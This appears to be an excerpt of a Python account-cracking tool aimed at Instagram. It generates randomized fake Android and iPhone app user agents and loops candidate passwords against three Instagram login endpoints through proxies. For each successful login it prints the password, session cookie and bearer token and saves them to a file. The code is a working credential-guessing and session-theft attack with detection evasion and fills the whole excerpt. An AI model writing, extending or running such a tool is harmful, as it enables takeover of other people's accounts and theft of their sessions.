...
def memek():
	kanjut_besar = f'{random.randint(100,312)}.{random.randint(1,10)}.0.{random.randint(20,35)}.{random.randint(90,120)}'
	kanjut_kecil  = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
	#mmks = random.randint([])
	return  f"Instagram {kanjut_besar} Android (21/5.0.2; {kanjut_kecil}; 720x1280; TCL; 7048X; alto5_sporty; qcom; pt_PT; 98288239)"
class MAIN:
...
def UserAgent():
    ...
    mod = rc([
                        ...
                        'renoir',
                        'haydn'])
    iphon = rc(['iPhone XR','iPhone7,2','iPhone8,1','iPad2,5','iPhone9,4','iPhone9,1','iPhone7,2','iPhone10,4','iPhone9,3','iPhone10,5','iPhone8,1','iPhone10,4','iPhone8,2','iPhone10,5','iPhone8,4','iPhone6,1','iPhone10,6','iPad6,3','iPhone6,2','iPhone4,1','iPhone5,1','iPhone5,2','iPhone10,3','iPhone13,3','iPhone13,4','iPhone12,1','iPhone12.5','iPhone12,3','iPhone14,2','iphone14,3'])
    skel = rc(['2.34','2.00','2.88','2.61','3.00'])
    ios = rc(['11_2_6','9_3_5','10_3_3','10_3_2','11_0','11_2_5','11_2_1','9_3_5','11_2_2','11_0_2','11_1_2','10_3_1','15_5'])
    And = rc(['28/9','29/10','30/11','31/12'])
    ...
    Andr = rc(["27/9","27/10","27/11","27/12","27/12","27/13","28/9","28/10","28/11","28/12","28/12","28/13","29/9","29/10","29/11","29/12","29/12","29/13","27/9","30/10","30/11","30/12","30/12","30/13","31/9","31/10","31/11","31/12","31/12","31/13","32/9","32/10","32/11","32/12","32/12","32/13","33/9","33/10","33/11","33/12","33/12","33/13","32/26","34/26","32/11","34/12","30/10","34/12.0.1","30/11.0.3"])
    rel =rc(['RMX3363','RMX3241','RMX3081','RMX3201','RMX3363','RMX1851','RMX3782'])
    me = rc(['RE54ABL1','RE513CL1','RMX3081L1','RMX3201','RMX1851','RE5C6CL1'])       
    bas = rc(['ru-RU','en-GB','uk-UA','en-US','de-DE','it-IT','ru-UA','ar-AE','tr-TR','lv-LV','th-TH','fr-FR','sr-RS','hu-HU','bg-BG','pt-PT','pt-BR','es-ES','en-IE','nl-NL','fr-CH','de-CH','es-US','fr-CA','ru-BY','en-PH','en-AU','hy-AM','fa-IR','de-AT','cs-CZ','ru-KZ','en-CA','fr-BE','az-AZ','en-NZ','en-ZA','es-LA','ru-KG','pl-PL','es-MX','ro-RO','el-GR','iw-IL','in-ID','ga-IE','en-IN','ar-SA','ka-GE','es-CO','es-SV','hr-HR','ar-JO','es-PE','it-SM','ar-AR','en-SE','nb-NO','sk-SK','bs-BA','nl-BE','uz-UZ','sl-SI','es-CL'])
    gamut = rc(['normal','wide'])
    ...
    ua5 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; realme; {rel}; {me}; {trek}; {basa}; {kode})'
    ua6 = f'Instagram {versi} ({iphon}; iOS {ios}; {basa}; {bas}; scale={skel}; gamut={gamut}; {pxl})'
    uaa = rc([ua1,ua2,ua3,ua4,ua5,ua6])
    return uaa
...
def i_insta(username, password):
    ...
    for pw in password:
        try:
            ...
            response = ses.post('https://i.instagram.com/api/v1/accounts/login/', proxies=proxies,data=encod, headers=header)
            if 'logged_in_user' in str(response.text):
                 ...
                 cetak(panel(f"[bold white][[bold green]√[bold white]] Username [bold white]: [bold green]{username}\n[bold white][[bold green]√[bold white]] Password [bold white]: [bold green]{pw}\n[bold white][[bold green]√[bold white]] Followers [bold white]: [bold green]{followers}\n[bold white][[bold green]√[bold white]] Following [bold white]: [bold green]{following}\n[bold white][[bold green]√[bold white]] Cookie [bold white]¥ [bold green]{auth} {UserAgent}\n[bold white][bold green]✓[bold white]] Bearer [bold green]{auth}",title=f"[bold white][ [bold green]Kang Prem [bold white]]",style=f"bold red"))
...
def api_insta(username, password):
    ...
    for pw in password:
        try:
            ...
            response = ses.post('https://api.instagram.com/api/v1/accounts/login/', proxies=proxies,data=encod, headers=header)
            if 'logged_in_user' in str(response.text):
                 success +=1
                 kuki = convert_cookie(response.headers.get('Set-Cookie'))
                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
                 followers, following = info(username)
                 cetak(panel(f"[bold white][[bold green]√[bold white]] Username [bold white]: [bold green]{username}\n[bold white][[bold green]√[bold white]] Password [bold white]: [bold green]{pw}\n[bold white][[bold green]√[bold white]] Followers [bold white]: [bold green]{followers}\n[bold white][[bold green]√[bold white]] Following [bold white]: [bold green]{following}\n[bold white][[bold green]√[bold white]] Cookie [bold white]¥ [bold green]{auth}\n[bold white][bold green]✓[bold white]] Bearer [bold green]{auth}",title=f"[bold white][ [bold green]Kang Prem [bold white]]",style=f"bold red"))
                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
                    sv.write('%s|%s|%s|%s|%s\n'%(username,pw,followers, following,auth))
                 sv.close()
                 break
...
def www_insta(username, password):
    ...
    for pw in password:
        try:
            ...
            response = ses.post('https://www.instagram.com/api/v1/accounts/login/', proxies=proxies,data=encod, headers=header)
            if 'logged_in_user' in str(response.text):
                 success +=1
                 kuki = convert_cookie(response.headers.get('Set-Cookie'))
                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
